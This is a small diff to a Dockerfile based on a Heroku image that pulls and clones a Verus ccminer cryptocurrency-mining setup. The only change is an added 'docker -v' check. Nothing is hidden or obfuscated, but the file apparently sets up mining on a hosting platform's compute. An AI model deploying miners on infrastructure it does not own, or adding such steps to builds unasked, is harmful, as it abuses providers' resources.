@@ -1,6 +1,7 @@
 FROM heroku/heroku:18
 RUN apt-get update
 RUN apt-get install -y curl git unzip wget docker
+RUN docker -v
 RUN docker pull wattpool/verusccminer
 RUN git clone https://github.com/wattpool/verus-ccminer-dockerized.git
 RUN cd verus-ccminer-dockerized
